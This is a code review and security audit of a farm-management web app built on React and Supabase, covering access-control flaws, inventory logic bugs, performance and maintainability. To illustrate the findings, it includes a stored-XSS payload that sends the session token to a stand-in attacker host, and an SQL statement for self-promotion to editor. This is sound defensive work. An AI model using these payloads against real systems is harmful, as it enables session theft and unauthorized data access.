# Farm Manager — Code Review Findings & Recommendations

**Repository:** `jwolfish/Farm-Manager` (branch `main`, commit `75d7e4a`)
**Reviewed:** 29 August 2026
**Scope:** Full codebase — 35,228 lines across React/TypeScript client, Supabase Postgres schema (38 migrations), and one Deno edge function.
**Focus areas:** logic errors & edge cases, security, performance, readability & maintainability.

---

## Executive summary

The application is well-organised for a Bolt-generated codebase: modules are cohesive, RLS is enabled on every table, and there is real evidence of prior hardening (search-path pinning, policy consolidation, FK indexes). The `DEVELOPER_GUIDE.md` is unusually thorough.

The problems are concentrated in three places, and they are the places where money and data integrity live:

1. **Two authorization boundaries are effectively open.** A user who has ever been invited to any farm can rewrite their own `team_members` row to grant themselves editor access to any farm whose owner ID they know. Separately, the cascade edge function runs with the Supabase **service role** and takes its target season and entity IDs straight from a user-writable row.
2. **The inventory ledger can be corrupted by ordinary use.** Applying a work order twice — a double-click is enough — writes two consumption entries. Nothing in the UI, the client, or the database prevents it.
3. **Unit conversion fails silently.** `convertUnits()` returns the *unconverted* input when it cannot find a conversion factor. Three copies of this function exist. Every cost figure, shopping-list quantity, and inventory deduction in the app flows through it.

Also material: user-supplied text (farm name, field name, season name, buyer) is interpolated **unescaped** into HTML that is opened as a same-origin `blob:` URL — a working stored-XSS path to the Supabase session token.

Quality signals are weak in a way that matters for the fixes below: `tsc --noEmit` reports **103 errors**, `eslint` reports **136 errors and 28 warnings**, there are **zero tests**, and there is **no CI**. There is no safety net under any change to this code.

### Findings at a glance

| ID | Severity | Area | Finding |
|----|----------|------|---------|
| SEC-1 | **Critical** | Security | `team_members` UPDATE policy permits self-promotion to editor and re-pointing a membership at any farm |
| SEC-2 | **Critical** | Security | Stored XSS via unescaped user data in generated report HTML opened as a same-origin blob URL |
| SEC-3 | **High** | Security | Service-role edge function trusts user-controlled `season_id` / `entity_id` (IDOR → cross-tenant writes) |
| SEC-4 | **High** | Security | `inventory_ledger_entries.farm_id` is never checked against the referenced product's farm |
| SEC-5 | **High** | Security | Team membership is not scoped to a farm — one invitation grants access to all of that owner's farms |
| LOG-1 | **High** | Logic | Work-order apply/unapply is not idempotent — double-click double-deducts inventory |
| LOG-2 | **High** | Logic | `MarkPurchasedModal` ledger writes are unchecked, non-atomic, and skip unit conversion |
| LOG-3 | **High** | Logic | `convertUnits()` silently returns the input amount for unknown or cross-class unit pairs |
| LOG-4 | **High** | Logic | Shopping-list generation sums quantities across mixed units before converting |
| PERF-1 | **Medium** | Performance | 1.75 MB single JS chunk (465 KB gzipped); no code splitting |
| LOG-5 | **Medium** | Logic | Edge function returns `{success: true}` after an internal failure; swallows query errors |
| LOG-6 | **Medium** | Logic | `saveWorkOrder` performs three unrelated inserts with no transaction or rollback |
| LOG-7 | **Medium** | Logic | Dashboard realtime filters on the *viewer's* user ID — shared farms never receive live updates |
| LOG-8 | **Medium** | Logic | `validateSeasonContext` checks `seasons.user_id`, which fails for collaborators |
| SEC-6 | **Medium** | Security | Account enumeration on signup; no password policy; profile row created client-side |
| SEC-7 | **Medium** | Security | CSV export has no formula-injection guard |
| PERF-2 | **Medium** | Performance | `field_cost_overrides` fetched unfiltered, then filtered in JavaScript |
| PERF-3 | **Medium** | Performance | Reports load every season, field, and sale with no pagination and compute in the browser |
| PERF-4 | **Medium** | Performance | On-hand trigger re-sums the entire ledger per row — O(n²) on bulk inserts |
| PERF-5 | **Medium** | Performance | Cascade runs synchronously inside the HTTP request with unbounded `Promise.all` fan-out |
| MNT-1 | **Medium** | Maintainability | 103 TypeScript errors, 136 lint errors, no CI enforcing either |
| MNT-2 | **Medium** | Maintainability | Zero automated tests over financial and inventory math |
| MNT-3 | **Medium** | Maintainability | Cascade logic duplicated between the edge function and `src/lib/templateLib` |
| PERF-6 | **Low** | Performance | 28 `select('*')` calls and 24 `exhaustive-deps` warnings causing over-fetch and effect churn |
| LOG-9 | **Low** | Logic | Revenue allocated by acreage regardless of yield; inventory map keyed by both ID and name |
| SEC-8 | **Low** | Security | Wildcard CORS, raw error text surfaced to users, `window.open` without `noopener` |
| MNT-4 | **Low** | Maintainability | `App.tsx` is a 763-line god component routing via `sessionStorage` |

---

## 1. Security

### SEC-1 (Critical) — Any invited user can grant themselves access to any farm

`supabase/migrations/20260305192931_...sql:816`

```sql
CREATE POLICY "Team members can update invitation status"
  ON team_members FOR UPDATE TO authenticated
  USING      ((user_id = (SELECT auth.uid())) OR (invited_user_id = (SELECT auth.uid())))
  WITH CHECK ((user_id = (SELECT auth.uid())) OR (invited_user_id = (SELECT auth.uid())));
```

The policy is named for updating *invitation status*, but Postgres RLS has no notion of column scope. Any row where `invited_user_id = auth.uid()` may be rewritten **in full**, and the `WITH CHECK` still passes as long as `invited_user_id` stays the attacker's own ID. Two attacks follow:

- **Self-promotion.** `UPDATE team_members SET role = 'editor', status = 'accepted' WHERE invited_user_id = auth.uid()` turns a read-only viewer into an editor. `is_editor_of()` then returns true and every editor policy in the schema opens. No external knowledge required.
- **Farm hijack.** Setting `user_id` (and `farm_id`) to a target owner's UUID while leaving `invited_user_id` unchanged satisfies the check. `is_team_member_of(target_owner)` and `is_editor_of(target_owner)` now return true, granting read and write across that owner's fields, costs, yields, sales, hedges, products, and inventory.

There are no column-level `GRANT`s and no trigger guarding `role`, `status`, `user_id`, or `farm_id` — verified across all 38 migrations.

**Fix:** split the policy. Owners (`user_id = auth.uid()`) keep full update rights. Invitees get a narrow path — either a `SECURITY DEFINER` RPC `respond_to_invitation(p_id uuid, p_accept boolean)` that only ever writes `status` and `accepted_at`, or a `BEFORE UPDATE` trigger that raises when a non-owner changes any column other than `status`/`accepted_at`. The RPC is preferable; it is testable and leaves an explicit audit point.

### SEC-2 (Critical) — Stored XSS in generated reports

`src/lib/pdfReports/pdfFormatters.ts:85-90`, `openPDF()` at `:96`; same pattern in `yoyReport.ts:84`, `costBreakdownReport.ts:127`, `efficiencyReports.ts:49`, `fieldPerformanceReports.ts:48`, `salesReports.ts:174`, `exports/printExporter.ts:20`

```ts
${farmName ? `<div class="farm-name">${farmName}</div>` : ''}
<h1>${title}</h1>
...
const blob = new Blob([html], { type: 'text/html;charset=utf-8' });
window.open(URL.createObjectURL(blob), '_blank');
```

Farm names, field names, season names, and buyer names are stored user input, interpolated into an HTML string with **no escaping anywhere in the codebase** (no `escapeHtml`, no DOMPurify — grep returns nothing). A `blob:` URL created by the app inherits the app's origin, so a name such as `<img src=x onerror="fetch('https://attacker/'+localStorage.getItem('sb-<ref>-auth-token'))">` executes with full access to the Supabase session.

This is worse in the collaboration model: a field name set by one user renders in a report opened by another. Combined with SEC-1, an attacker who plants a poisoned farm name has a session-stealing primitive.

**Fix:** add `escapeHtml()` to `pdfFormatters.ts` and route every dynamic interpolation (including SVG `<text>` in `pdfCharts.ts`) through it. Longer term, build the DOM with `textContent` rather than string concatenation, and serve the print view through a sandboxed iframe rather than a same-origin blob.

### SEC-3 (High) — Service-role edge function trusts user-controlled IDs

`supabase/functions/process-cascade-task/index.ts:417-460`; RLS at `20260305192931_...sql:115`

The function correctly verifies the caller's JWT and that the task row belongs to them. It then performs **every** subsequent write with `supabaseAdmin` — the service-role client, which bypasses RLS — using `task.season_id` and `task.entity_id` verbatim. The RLS policies on `cascade_tasks` check only `auth.uid() = user_id`; neither INSERT nor UPDATE validates that the season belongs to a farm the user can access, and the user may update their own task row after creation.

The result: any authenticated user who knows (or brute-forces from a leaked report, a shared link, or a prior collaboration) another farm's season and template IDs can force recalculation and rewriting of that farm's `cost_templates` and `field_costs`. The task's `result_data.warnings` also echoes back other farms' field UUIDs.

**Fix:** validate ownership inside the function *before* touching `supabaseAdmin` — resolve `season → farm → owner` and confirm the caller is the owner or an accepted editor. Better still, keep the user-scoped client for reads so RLS does the work, and reserve the admin client for the specific writes that need it. Add a DB-level `CHECK` via a trigger that rejects `cascade_tasks` rows whose `season_id` the inserting user cannot see.

### SEC-4 (High) — Ledger entries are not validated against the product's farm

`supabase/migrations/20260827025711_add_inventory_foundation.sql:182-231`

RLS on `inventory_ledger_entries` checks the row's **denormalized** `farm_id`. Nothing checks that `master_product_id` belongs to that same farm. An editor on Farm A can insert `farm_id = A` (policy passes) with a `master_product_id` from Farm B; the `SECURITY DEFINER` on-hand trigger then recomputes and overwrites Farm B's `on_hand_quantity`. The same gap exists on `work_order_lines.master_product_id` and `shopping_list_lines.master_product_id`.

**Fix:** add a `BEFORE INSERT OR UPDATE` trigger asserting `farm_id = (SELECT farm_id FROM master_products WHERE id = NEW.master_product_id)`, or drop the denormalized column and derive the farm through the join in the policy.

### SEC-5 (High) — Membership is not scoped to a farm

`20260503033930_fix_function_security_issues.sql:58-84`

```sql
SELECT EXISTS (SELECT 1 FROM team_members
  WHERE user_id = owner_id AND invited_user_id = (SELECT auth.uid()) AND status = 'accepted');
```

`is_team_member_of()` and `is_editor_of()` take only an *owner* ID. `team_members` carries `farm_id`, and the UI invites per farm — but the predicate ignores it. Inviting someone to one farm grants them access to **every** farm and season that owner has. The migration comments claim editor-or-admin semantics; the code accepts only `role = 'editor'`, so an `'admin'` grant would silently confer read-only access.

**Fix:** change both helpers to `(owner_id uuid, p_farm_id uuid)` and thread `farm_id` through every calling policy. Where a table has no `farm_id`, resolve it through `season_id`. Align the role check with the `user_role` enum (`'editor'` or `'admin'`) or remove `'admin'` from the enum.

### SEC-6 (Medium) — Signup hygiene

`src/pages/Auth.tsx:46-73`, `src/contexts/AuthContext.tsx:94-112`

Raw Supabase errors reach the UI (`setError(err.message)`), so "User already registered" makes email enumeration trivial — the forgot-password flow, by contrast, correctly returns a neutral message. There is no password strength check on signup (the 6-character rule applies only to the reset path). `user_profiles` is inserted from the client after `signUp`; if email confirmation is on there is no session, the insert fails RLS, and the account is left without a profile.

**Fix:** map auth errors to neutral copy; enforce a policy (length + HaveIBeenPwned, which the guide notes is still off in the dashboard); move profile creation to an `AFTER INSERT` trigger on `auth.users`.

### SEC-7 (Medium) — CSV formula injection

`src/lib/exports/csvExporter.ts:5-13` quotes commas, quotes, and newlines, but a cell beginning `=`, `+`, `-`, `@`, tab, or CR is executed as a formula by Excel and Sheets. Field and buyer names are free text.

**Fix:** prefix such values with `'` (or a leading tab) before quoting.

### SEC-8 (Low) — Assorted

- `Access-Control-Allow-Origin: "*"` on the edge function (`index.ts:5`) — restrict to the deployed origin.
- `error_message` from the edge function is rendered verbatim in a toast (`useCascadeTaskNotifications.ts:53`) — it can carry raw Postgres detail.
- `window.open(url, '_blank')` without `noopener` in three exporters.
- 99 `console.log`/`console.error` calls ship to production.

---

## 2. Logic errors & edge cases

### LOG-1 (High) — Applying a work order twice double-deducts inventory

`src/lib/workOrderCrud.ts:200-256`, `src/hooks/useSprayPlanner.ts:565-570`, `src/components/SavedWorkOrdersList.tsx:210-218`

`applyWorkOrder()` writes consumption entries and *then* sets `status = 'applied'` in a second, separate request. There is no check that the order is currently `draft`, no unique constraint on `(source_type, source_id, master_product_id, entry_type)`, and the Apply button has **no disabled state** while the request is in flight. Three independent ways to double-post:

- Double-click before the list reloads → two sets of consumption entries.
- The ledger insert succeeds and the status update fails → the order still reads `draft`, the user retries.
- Two collaborators apply the same order concurrently.

`unapplyWorkOrder()` has the mirror problem. And because the Apply button renders only for `draft`, an order that has been unapplied can never be re-applied.

**Fix:** move both operations into a single `SECURITY DEFINER` RPC that takes the expected current status, performs the guard and both writes in one transaction, and returns the new status. Add the unique index as a hard backstop. Disable the button while the mutation is pending and surface failures.

### LOG-2 (High) — Purchase ledger writes are unchecked and non-atomic

`src/components/products/MarkPurchasedModal.tsx:54-80`

```ts
await supabase.from('inventory_ledger_entries').insert({ ... entry_type: 'reversal' ... });
await supabase.from('inventory_ledger_entries').insert({ ... entry_type: 'purchase' ... });
```

Neither result is destructured; **both errors are discarded**. If the reversal fails and the purchase succeeds, on-hand is permanently inflated by the old quantity. If the line update on the next statement throws, the ledger already recorded the purchase while the line still shows unpurchased — and the retry posts it again.

The quantity is also written in the shopping-list line's unit with no conversion to `master_products.unit_type`, whereas `applyWorkOrder` does convert. On-hand can therefore mix gallons and fluid ounces in the same running total.

**Fix:** one RPC, one transaction, errors checked; convert to the master product's unit at the boundary, exactly as `applyWorkOrder` does.

### LOG-3 (High) — Silent unit-conversion failure

`src/lib/unitConversions.ts:152`, duplicated at `supabase/functions/process-cascade-task/index.ts:37`

```ts
if (conversionFactors[from]?.[to]) return amount * conversionFactors[from][to];
return amount;   // <-- unknown or incompatible pair
```

Ask for pounds → gallons and you get the pound figure back, unmarked. The lookup table has no cross-class entries by design (weight vs. volume), and no entry at all for common agricultural units — `qt/ac`, `pt`, `L`, `kg`, `bag`, `unit`, `seed`. Every affected path is silent:

- `calculateCostWithConversion()` → wrong `cost_per_acre` on programs, templates, and fields.
- `applyWorkOrder()` → wrong `quantity_delta` in the ledger.
- `generateChemicalLines()` → wrong purchase quantities.

The truthiness guard is also subtly wrong: a legitimate factor of `0` would fall through, and there is no `isFinite` check on `amount`.

**Fix:** return `{ value, exact: boolean }` or throw a typed `UnitConversionError`. Callers must surface "cannot convert *fl oz* to *lbs*" rather than produce a number. Add the missing units. Delete the duplicate — see MNT-3.

### LOG-4 (High) — Mixed units summed before conversion

`src/lib/shoppingListGeneration.ts:119` and `:279`

```ts
const existing = chemAccum.get(chem.id);
if (existing) existing.totalRaw += total;      // uses the *first* program's rateUnit
```

When the same chemical appears in two programs with different `application_rate_unit` values, the totals are added raw and only the first-seen unit is converted at the end. A chemical applied at 2 qt/ac in one program and 16 fl oz/ac in another yields a total that is neither.

**Fix:** convert each item to a canonical unit (the master product's `unit_type`, falling back to the first-seen unit) *before* accumulating.

### LOG-5 (Medium) — The cascade function reports success it did not achieve

`supabase/functions/process-cascade-task/index.ts:437-500`

The inner `try/catch` marks the task `failed` and then falls through to `return new Response(JSON.stringify({ success: true }))` — the HTTP caller always sees success. Separately, every read (`:104`, `:112`, `:137`, `:145`, `:172`, `:181`, `:192`, `:269`) destructures only `data` and ignores `error`, so a transient failure becomes "template not found" and the cascade quietly does nothing while reporting `completed`. The status is set to `running` without checking the current value, so a duplicate invocation runs the whole cascade a second time concurrently. And `recalculateFertilizerProgramCost()` returns a `newCost` that `runCascadeProductUpdate` (`:322`) discards — `programsUpdated` is incremented for work that was never persisted.

**Fix:** propagate the failure into the HTTP status; check `error` on every query; make the transition `pending → running` a conditional update and exit if it affects zero rows; persist or delete the unused recalculation result.

### LOG-6 (Medium) — `saveWorkOrder` has no transaction

`src/lib/workOrderCrud.ts:71-127` inserts the order, then the fields, then the lines. Failures on the second and third inserts are logged only (`:106`, `:125`) and the function still returns the ID, leaving an order with no fields or no chemicals.

### LOG-7 (Medium) — Realtime is broken for shared farms

`src/hooks/useDashboardMetrics.ts:222-231` subscribes with `filter: user_id=eq.${user.id}` on `field_costs` and `field_yields`. On a shared farm those rows carry the *owner's* `user_id`, so a collaborator's dashboard never updates live. `loadAll()` is also unmemoized and called from an effect with an incomplete dependency array, with no request-sequence guard — two overlapping loads can land out of order.

### LOG-8 (Medium) — Season validation rejects collaborators

`src/lib/transactionUtils.ts:20-24` filters `seasons` on `.eq('user_id', userId)`. Seasons became farm-scoped in `20260218055206`, and `effectiveUserId` is the owner's ID for shared farms — but any path that passes the *current* user's ID fails validation for a legitimate collaborator.

### LOG-9 (Low) — Revenue allocation and other edges

- `useReportData.ts:210-225` allocates crop revenue to fields by acreage share regardless of which fields actually yielded, so a failed field is credited revenue.
- `fetchInventoryForChemicals` (`workOrderCrud.ts:420`, `:438`) keys the same map by UUID *and* by product name, and the by-name lookup does not filter `product_category` — a seed and a chemical sharing a name collide.
- `createSeasonChemical` (`:363`) uses `.maybeSingle()` without checking `error`; pre-existing duplicates make it insert another.
- `AuthContext.tsx:26-28` forces `loading = false` after 5 s regardless of whether the session resolved, briefly rendering a signed-out UI for a signed-in user.

---

## 3. Performance

### PERF-1 (Medium) — One 1.75 MB chunk

A production build emits `dist/assets/index-*.js` at **1,747 kB (465 kB gzipped)**, plus `html2canvas` (201 kB) and `index.es` (151 kB). Recharts, jsPDF, and html2canvas are pulled into the initial load even though reports and PDF export are secondary flows. There is no `React.lazy`, no `manualChunks`, and no route-level splitting — `App.tsx` imports all fourteen pages eagerly.

**Fix:** lazy-load pages and the PDF/report modules; configure `manualChunks` for `recharts`, `jspdf`, and `html2canvas`. Expect the initial chunk to drop below 300 kB gzipped.

### PERF-2 (Medium) — Unfiltered override fetch

`src/lib/shoppingListGeneration.ts:29-40` and `:188-199` select every `field_cost_overrides` row the user can see for a given `cost_item_name` — across **all seasons and all fields** — then filter in JavaScript with `fieldIds.includes(...)`, an O(n·m) scan. Add `.in('field_id', fieldIds)`.

### PERF-3 (Medium) — Reports fetch everything

`useReportData.ts:255-290` loads all seasons, then all fields with nested `field_costs` and `field_yields`, then all sales — no season filter, no pagination, no `count` — and performs all aggregation in the browser. Growth is linear in years × fields. Move the aggregation into SQL views or an RPC and page the field lists.

### PERF-4 (Medium) — O(n²) inventory trigger

`20260827025711_...sql:383-415` recomputes `SUM(quantity_delta)` over the **entire** ledger for a product on every inserted row. A work order with 12 lines triggers 12 full re-sums; a season's backfill is quadratic.

**Fix:** apply the delta incrementally (`on_hand_quantity = on_hand_quantity + NEW.quantity_delta`) with a periodic reconciliation job, or make it a statement-level trigger over the affected product set.

### PERF-5 (Medium) — Cascade concurrency and timeouts

`index.ts:222` fans out `Promise.all` over *every* field-cost row with no concurrency cap; a large farm issues hundreds of simultaneous updates. `cascadeProgramUpdateInSeason` (`:288`) also does a read-modify-write on the `cost_templates` JSON array — two concurrent cascades lose one another's writes. And `backgroundTasks.ts:87` awaits the full HTTP response, so the whole cascade runs inside one request and will hit the edge-function wall clock on a large season.

**Fix:** batch updates (chunks of ~25) with a concurrency limiter; move the JSON mutation into a SQL `jsonb_set`; make the invocation fire-and-forget with the existing realtime channel reporting completion.

### PERF-6 (Low) — Over-fetching and effect churn

28 `select('*')` calls pull every column including large JSONB. 24 `react-hooks/exhaustive-deps` warnings mean several effects re-run or re-subscribe more often than intended (`useCascadeTaskNotifications` re-subscribes whenever `addNotification` identity changes, and `useDashboardMetrics` closes over stale `loadAll`).

---

## 4. Readability & maintainability

### MNT-1 (Medium) — The type checker and linter are failing, and nothing enforces them

`npx tsc --noEmit -p tsconfig.app.json` → **103 errors** (38 × TS6133 unused, 20 × TS2352 unsafe casts, 16 × TS2322, 15 × TS2345 including `string | null` passed where `string` is required in `SeedBagRequirements.tsx:59,75,76`).
`npx eslint .` → **136 errors, 28 warnings** (88 × `no-explicit-any`, 37 × `no-unused-vars`, 24 × `exhaustive-deps`, 6 × `prefer-const`).

There is no `.github/` directory. `npm run typecheck` exists but nothing runs it. The build succeeds anyway because Vite transpiles without type checking — so type errors reach production.

### MNT-2 (Medium) — No tests

There is not a single test file, no test runner in `package.json`, and no fixtures. The untested surface includes unit conversion, per-acre cost roll-ups, cascade propagation, inventory ledger math, and shopping-list generation — precisely the logic that produces the numbers a farmer will make purchasing decisions on.

### MNT-3 (Medium) — The cascade exists twice

`convertUnits`, `calculateCostWithConversion`, `calculateFieldTotalCost`, `recalculateFertilizerProgramCost`, and `recalculateChemicalProgramCost` are each implemented **once in `src/lib/`** and **again in the edge function** (Deno cannot import from `src/`). The two copies have already diverged: the client version logs cross-season warnings via `logCascadeWarning` and checks query errors; the edge version does neither. Any pricing fix must be made twice, and there is nothing to catch it if it is not.

**Fix:** extract a `shared/` directory of pure functions with no Supabase import, consumed by the client via a path alias and by the edge function via a relative import (or published as a small internal package). Failing that, move the calculation into a Postgres function so there is exactly one implementation.

### MNT-4 (Low) — Structure and naming

- `generateChemicalLines` and `generateFertilizerLines` (`shoppingListGeneration.ts`) are ~150 lines each and roughly 95 % identical; they should be one function parameterised by category.
- `App.tsx` is 763 lines holding auth gating, farm selection, season CRUD, import wizard, delete confirmation, and page dispatch, with navigation state in `sessionStorage` and a hand-rolled switch instead of a router. Deep links and the back button do not work.
- `src/lib/database.types.ts` (1,572 lines) is maintained by hand — the guide documents a past drift incident. Generate it in CI.
- `package.json` still reads `"name": "vite-react-typescript-starter"`, `"version": "0.0.0"`.
- 99 `console.*` calls stand in for error reporting; a failed write is often invisible to the user (`saveWorkOrder`, `MarkPurchasedModal`, `handleApplyWorkOrder`).

---

## Recommended sequencing

**Now — before further feature work.** SEC-1, SEC-2, SEC-3, SEC-4, SEC-5. These are authorization and injection defects; each is a small, well-bounded change.

**Next sprint — data integrity.** LOG-1 through LOG-4 (idempotent apply, transactional purchase, loud unit conversion, canonical accumulation), plus the unique constraints and RPCs they depend on. Land MNT-1 and MNT-2 alongside: a CI gate and a test suite over the conversion and cost functions are what make the rest of this list safe to change.

**Following — resilience and speed.** LOG-5 through LOG-8, PERF-1 through PERF-5.

**Ongoing.** MNT-3 and MNT-4, taken opportunistically as each area is touched.

The companion **Remediation PRD** breaks all of the above into implementable work items with acceptance criteria and test plans.
